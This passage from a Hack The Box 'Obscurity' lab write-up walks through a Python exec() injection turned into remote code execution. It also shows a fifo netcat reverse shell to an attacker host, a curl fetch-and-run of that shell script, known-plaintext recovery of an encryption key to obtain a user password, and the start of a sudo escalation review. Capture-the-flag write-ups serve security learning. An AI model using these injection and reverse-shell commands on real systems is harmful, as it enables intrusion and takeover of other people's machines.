<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: os.system(<span class="string">'sleep 5'</span>)</span><br><span class="line">output = <span class="string">'Document: os.system('</span>sleep 5<span class="string">')'</span></span><br></pre></td></tr></table></figure>

<p>This is not going to work, we will need to escape the python command, let’s give it another try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python injection.py</span><br><span class="line">Command to execute: <span class="string">';os.system('</span>sleep 5<span class="string">');'</span></span><br><span class="line">output = <span class="string">'Document: '</span>;os.system(<span class="string">'sleep 5'</span>);<span class="string">''</span></span><br></pre></td></tr></table></figure>

<p>Looks good to me and doesn’t throw error, let’s add the same <code>exec()</code> than in the original to make sure the injection will work properly against the server:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">path = <span class="string">"';os.system('sleep 5');'"</span></span><br><span class="line">info = <span class="string">"output = 'Document: &#123;&#125;'"</span></span><br><span class="line">exec(info.format(path))</span><br></pre></td></tr></table></figure>

<p>And let’s run it, if it hang for 5 seconds then it mean our injection was successful:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ time python injection.py</span><br><span class="line">python tmp.py  0.02s user 0.01s system 0% cpu 5.029 total</span><br></pre></td></tr></table></figure>

<p>It worked perfectly. Let’s now gather everything we know to achieve remote code execution on the server:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://obscurity.htb:8080/';os.system('&#123;&#125;');'"</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    cmd = input(<span class="string">"Command to execute: "</span>)</span><br><span class="line">    r = requests.get(url.format(cmd))</span><br></pre></td></tr></table></figure>

<p>We will try to execute a reserve shell. After having no luck getting the classical <code>netcat</code> nor <code>python</code> reverse shell to work (which is strange since we know python is running on the box), I managed to get the <a href="https://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498" target="_blank" rel="noopener"><code>fifo netcat</code></a> reverse shell to work:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8.sh</span><br><span class="line">rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 8585 &gt;/tmp/h</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>Then we open our listener:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure>

<p>And finally we send our payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python rce.py</span><br><span class="line">Command to execute: curl 10.10.10.10:8000/hg8.sh -o /tmp/hg8.sh</span><br><span class="line">Command to execute: bash /tmp/hg8.sh</span><br></pre></td></tr></table></figure>

<p>Aand we get the connection:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 10.10.10.168:43378</span><br><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<p><em>Note: Looking around we immediately notice that the python bin used is <code>pyhton3</code> that’s why the common <code>python</code> shell wasn’t working. As usual it’s easy to overlook simple blockers like this one…</em></p>
<h3 id="Pivot-www-data-gt-Robert"><a href="#Pivot-www-data-gt-Robert" class="headerlink" title="Pivot www-data -&gt; Robert"></a>Pivot www-data -&gt; Robert</h3><p>Quick recon shows that the user is <code>robert</code> and have a few interesting files we can read:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/$ ls -l /home/robert/</span><br><span class="line">ls -l /home/robert/</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH</span><br><span class="line">-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt</span><br><span class="line">-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt</span><br><span class="line">-rwxrwxr-x 1 robert robert 2514 Oct  4 14:55 SuperSecureCrypt.py</span><br><span class="line">-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt</span><br></pre></td></tr></table></figure>

<p><code>passwordreminder.txt</code> sure looks interesting… Let’s check it out:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ cat passwordreminder.txt</span><br><span class="line">´ÑÈÌÉàÙÁÑé¯·¿k</span><br></pre></td></tr></table></figure>

<p>It’s encrypted. What else do we have ? Let’s see for <code>check.txt</code> and <code>out.txt</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ cat check.txt</span><br><span class="line">Encrypting this file with your key should result <span class="keyword">in</span> out.txt, make sure your key is correct!</span><br><span class="line">www-data@obscure:/home/robert/$ cat out.txt</span><br><span class="line">¦ÚÈêÚÞØÛÝÝ ×ÐÊß ÞÊÚÉ æßÝË ÚÛÚê ÙÉë éÑÒÝÍÐ êÆáÙÞã ÒÑ ÐáÙ¦ÕæØ ãÊÎÍ ßÚêÆ Ýáäè ÎÍÚ Îë ÑÓäáÛÌ×  v</span><br></pre></td></tr></table></figure>

<p>That’s interesting. <code>check.txt</code> explain that encrypting this same file will result in <code>out.txt</code> with a given key. We have both clear text message and it’s encrypted version. </p>
<p>Something also catch my eye. Did you notice that the encrypted version contain the same number of characters and the same spaces placement than the clear text one? </p>
<p>We can say with confidence that the encryption mechanism seems to simply encrypt each letter one by one using the key somehow. Let’s see if we can find more informations and possibly retrieve the key. If we find the key, we can decipher the <code>passwordreminder.txt</code> that will allow us to progress.</p>
<p>We didn’t take a look at <code>SuperSecureCrypt.py</code>, it’s easy to guess that it’s the script used to encrypt those file. This is the script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    decrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr - ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        decrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Encrypt with 0bscura\'s encryption algorithm'</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-i'</span>,</span><br><span class="line">                    metavar=<span class="string">'InFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'The file to read'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>,</span><br><span class="line">                    metavar=<span class="string">'OutFile'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Where to output the encrypted/decrypted file'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-k'</span>,</span><br><span class="line">                    metavar=<span class="string">'Key'</span>,</span><br><span class="line">                    type=str,</span><br><span class="line">                    help=<span class="string">'Key to use'</span>,</span><br><span class="line">                    required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-d'</span>, action=<span class="string">'store_true'</span>, help=<span class="string">'Decrypt mode'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">banner = <span class="string">"################################\n"</span></span><br><span class="line">banner+= <span class="string">"#           BEGINNING          #\n"</span></span><br><span class="line">banner+= <span class="string">"#    SUPER SECURE ENCRYPTOR    #\n"</span></span><br><span class="line">banner+= <span class="string">"################################\n"</span></span><br><span class="line">banner += <span class="string">"  ############################\n"</span></span><br><span class="line">banner += <span class="string">"  #        FILE MODE         #\n"</span></span><br><span class="line">banner += <span class="string">"  ############################"</span></span><br><span class="line">print(banner)</span><br><span class="line"><span class="keyword">if</span> args.o == <span class="literal">None</span> <span class="keyword">or</span> args.k == <span class="literal">None</span> <span class="keyword">or</span> args.i == <span class="literal">None</span>:</span><br><span class="line">    print(<span class="string">"Missing args"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> args.d:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line"></span><br><span class="line">        print(<span class="string">"Decrypting..."</span>)</span><br><span class="line">        decrypted = decrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(decrypted)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Opening file &#123;0&#125;..."</span>.format(args.i))</span><br><span class="line">        <span class="keyword">with</span> open(args.i, <span class="string">'r'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.read()</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Encrypting..."</span>)</span><br><span class="line">        encrypted = encrypt(data, args.k)</span><br><span class="line">    </span><br><span class="line">        print(<span class="string">"Writing to &#123;0&#125;..."</span>.format(args.o))</span><br><span class="line">        <span class="keyword">with</span> open(args.o, <span class="string">'w'</span>, encoding=<span class="string">'UTF-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(encrypted)</span><br></pre></td></tr></table></figure>

<p>Let’s break it down to better understand how it works: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parser = argparse.ArgumentParser(description=<span class="string">'Encrypt with 0bscura\'s encryption algorithm'</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-i'</span>, metavar=<span class="string">'InFile'</span>, type=str, help=<span class="string">'The file to read'</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-o'</span>, metavar=<span class="string">'OutFile'</span>, type=str, help=<span class="string">'Where to output the encrypted/decrypted file'</span>, required=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">'-k'</span>, metavar=<span class="string">'Key'</span>, type=str, help=<span class="string">'Key to use'</span>, required=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>Reading the <code>argparse</code>  we can quickly understand what’s this script will encrypt and decrypt a given file using a given key. </p>
<p>The function that interesting us is the encrypt function. Why is it interesting ? Because we have a clear text file and it’s encrypted version (<code>check.txt</code> and <code>out.txt</code>).</p>
<p>The encrypt function looks like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(text, key)</span>:</span></span><br><span class="line">    keylen = len(key)</span><br><span class="line">    keyPos = <span class="number">0</span></span><br><span class="line">    encrypted = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">        keyChr = key[keyPos]</span><br><span class="line">        newChr = ord(x)</span><br><span class="line">        newChr = chr((newChr + ord(keyChr)) % <span class="number">255</span>)</span><br><span class="line">        encrypted += newChr</span><br><span class="line">        keyPos += <span class="number">1</span></span><br><span class="line">        keyPos = keyPos % keylen</span><br><span class="line">    <span class="keyword">return</span> encrypted</span><br></pre></td></tr></table></figure>

<p>12 lines, taking it step by step we should have a good understanding of what it is doing. </p>
<p>Let’s start! </p>
<p>The function take 2 arguments, the text to encrypt and the secret key. Nothing surprising yet. </p>
<p>Second, third and fourth line respectively get the length of the key, initialize <code>keyPos</code> to <code>0</code> (which we can understand means “key position”) and initialize the <code>encrypted</code> variable that will for sure hold the final encrypted content since it’s returned at the end of the function.</p>
<p>The <code>for</code> loop every character of the content to encrypt, this seems to confirm our previous assumption that the content is encrypted letter-by-letter. </p>
<p>Inside the for loop, the encrypt mechanism takes place. </p>
<p> <code>keyChr = key[keyPos]</code> get the secret key letter position. For example if the secret password is <code>hg8</code> then at the first loop, <code>keyChr</code> will be <code>h</code>, second loop it will be <code>g</code> and third loop <code>8</code> since <code>keyPos</code> get incremented by one at the end of the loop.</p>
<p>Then, <code>ord()</code> function is used on the letter to encrypt. <a href="https://docs.python.org/3/library/functions.html#ord" target="_blank" rel="noopener">Python documentation</a> explain:</p>
<blockquote>
<p>Given a string representing one Unicode character, return an integer<br>representing the Unicode code point of that character. For example, <code>ord(&#39;a&#39;)</code> returns the integer <code>97</code> and <code>ord(&#39;€&#39;)</code> (Euro sign)<br>returns <code>8364</code>. This is the inverse of <a href="https://docs.python.org/3/library/functions.html#chr" target="_blank" rel="noopener" title="chr"><code>chr()</code></a>.</p>
</blockquote>
<p>Next line is where the Magic happens. Let’s break it down:</p>
<ol>
<li><p><code>newChr + ord(keyChr)</code> : The integer unicode code of the character to encrypt gets added to the integer unicode code of the current key character.</p>
</li>
<li><p><code>(newChr + ord(keyChr)) % 255)</code> gets the remainder from the division of the <code>keyChr</code> addition by <code>255</code> to make sure it doesn’t not exceed the Unicode code list.</p>
</li>
<li><p>Finally we convert the result integer of the operation back to string using <code>chr()</code></p>
</li>
</ol>
<p>The encrypted character then gets added to the final <code>encrypted</code> variable with <code>encrypted += newChr</code></p>
<p>The last two lines increments the key position, so that the next characters to be encrypted will be encrypted from the next character of the secret key and so on.</p>
<p><code>keyPos = keyPos % keylen</code> will restart the key position once we are at the end of the key. For example with <code>hg8</code> as a key, this is what will happen when <code>keyPos</code> is <code>3</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyPos = keyPos % keylen</span><br><span class="line">keyPos =   <span class="number">3</span>    %    <span class="number">3</span>    </span><br><span class="line">keyPos = <span class="number">0</span> <span class="comment"># keyPos will be 0 since 3 divided by 3 gets 0 as remainder</span></span><br></pre></td></tr></table></figure>

<p>Alright ! This seems pretty clear now (and not very robust encryption).</p>
<p>I am not going to describe the <code>decrypt()</code> function since it’s exactly the same but inverted.</p>
<p>Let’s now focus on how, from an encrypted string and it’s clear-text equivalent, we can find back the secret key used.</p>
<h3 id="Recovering-the-secret-key"><a href="#Recovering-the-secret-key" class="headerlink" title="Recovering the secret key"></a>Recovering the secret key</h3><p>Seeing the encrypt logic it’s easy to understand how to get back the key from an clear string and it’s encrypted equivalent :</p>
<blockquote>
<p>Clear character + Key Character = Encrypted Character</p>
<p>Key Character = Encrypted Character - Clear character</p>
</blockquote>
<p>With that in mind we are going to write a little script to recover the secret key used to encrypt <code>check.txt</code> to <code>out.txt</code>. To start we will input both clear and encrypted value:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clear = <span class="string">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span></span><br><span class="line">encrypted = <span class="string">"¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v"</span></span><br></pre></td></tr></table></figure>

<p>Here you need to be careful when copy pasting, because space of the encrypted version are not “usual” spaces and could mess up your script if you paste it as normal spaces. Here is how it should looks like (in vim for example):</p>
<p><img src="https://user-images.githubusercontent.com/9076747/72752623-f6e33100-3bc2-11ea-92b6-a025983eb467.png" alt=""></p>
<p>Here is the final script I made:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_key</span><span class="params">(clear, encrypt)</span>:</span></span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    position_clear = <span class="number">0</span></span><br><span class="line">    position_encrypt = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> character <span class="keyword">in</span> clear:</span><br><span class="line">        clear_char = clear[position_clear]</span><br><span class="line">        encrypt_char = encrypt[position_encrypt]</span><br><span class="line">        key_char = chr(ord(encrypt_char) - ord(clear_char))</span><br><span class="line">        key += key_char</span><br><span class="line">        position_clear += <span class="number">1</span></span><br><span class="line">        position_encrypt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> key </span><br><span class="line"></span><br><span class="line">clear = <span class="string">"Encrypting this file with your key should result in out.txt, make sure your key is correct!"</span></span><br><span class="line">encrypt = <span class="string">"¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v"</span></span><br><span class="line"></span><br><span class="line">key = recover_key(clear, encrypt)</span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure>

<p>Let’s run it:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python get_secret_key.py</span><br><span class="line">alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich</span><br></pre></td></tr></table></figure>

<p>Looks good! The key is repeating (remember <code>keyPos = keyPos % keylen</code>) but we can easily see it’s <code>alexandrovich</code>. Let’s try to use it to decrypt <code>passwordreminder.txt</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@obscure:/home/robert/$ python SuperSecureCrypt.py -i passwordreminder.txt -o passwordreminder.clear.txt -k alexandrovich</span><br><span class="line"><span class="comment">################################</span></span><br><span class="line"><span class="comment">#           BEGINNING          #</span></span><br><span class="line"><span class="comment">#    SUPER SECURE ENCRYPTOR    #</span></span><br><span class="line"><span class="comment">################################</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">  <span class="comment">#        FILE MODE         #</span></span><br><span class="line">  <span class="comment">############################</span></span><br><span class="line">Opening file passwordreminder.txt...</span><br><span class="line">Encrypting...</span><br><span class="line">Writing to passwordreminder.clear.txt...</span><br><span class="line">www-data@obscure:/home/robert/$ cat passwordreminder.clear.txt</span><br><span class="line">SecThruObsFTW</span><br></pre></td></tr></table></figure>

<p>Let’s try to login to Robert account with this password: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh robert@obscurity.htb</span><br><span class="line">robert@obscurity.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Wed Jan 22 14:56:30 2020 from 10.10.14.9</span></span><br><span class="line"><span class="string">robert@obscure:~$ cat user.txt</span></span><br><span class="line"><span class="string">exxxxxxxxxxxxxxxxxxx7</span></span><br></pre></td></tr></table></figure>

<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>One of the first thing I do when doing recon for root is checking the sudoer file for uncommon configuration.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -S -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> robert on obscure:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User robert may run the following commands on obscure:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py</span><br></pre></td></tr></table></figure>

<p>Interesting, another “homemade” script. And it can be run as <code>sudo</code>. Sounds like a bad idea to me. If we can find a flaw in this <code>BetterSSH.py</code> we will be able to escalate our privileges to root.</p>
<p>The python script is the following:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">path = <span class="string">''</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">8</span>))</span><br><span class="line">session = &#123;<span class="string">"user"</span>: <span class="string">""</span>, <span class="string">"authenticated"</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session[<span class="string">'user'</span>] = input(<span class="string">"Enter username: "</span>)</span><br><span class="line">    passW = input(<span class="string">"Enter password: "</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'/etc/shadow'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.readlines()</span><br><span class="line">    data = [(p.split(<span class="string">":"</span>) <span class="keyword">if</span> <span class="string">"$"</span> <span class="keyword">in</span> p <span class="keyword">else</span> <span class="literal">None</span>) <span class="keyword">for</span> p <span class="keyword">in</span> data]</span><br><span class="line">    passwords = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> x == <span class="literal">None</span>:</span><br><span class="line">            